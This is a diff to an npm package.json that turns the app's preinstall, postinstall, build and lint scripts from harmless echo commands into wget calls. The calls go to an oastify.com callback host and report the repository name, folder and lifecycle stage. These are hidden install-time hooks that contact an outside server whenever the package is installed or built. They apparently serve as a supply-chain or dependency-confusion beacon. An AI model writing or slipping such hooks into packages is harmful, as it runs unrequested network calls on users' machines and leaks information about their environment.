@@ -1,8 +1,10 @@
 {
   "name": "app",
   "scripts": {
-    "preinstall": "echo --",
-    "postinstall": "echo \"postinstall of the app\npwd: `pwd`\n--\""
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/better-understand-npm-demos\\&folder=app\\&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/better-understand-npm-demos\\&folder=app\\&postinstall",
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/better-understand-npm-demos\\&folder=app\\&build",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/better-understand-npm-demos\\&folder=app\\&lint"
   },
   "dependencies": {
     "a": "1.0.0",
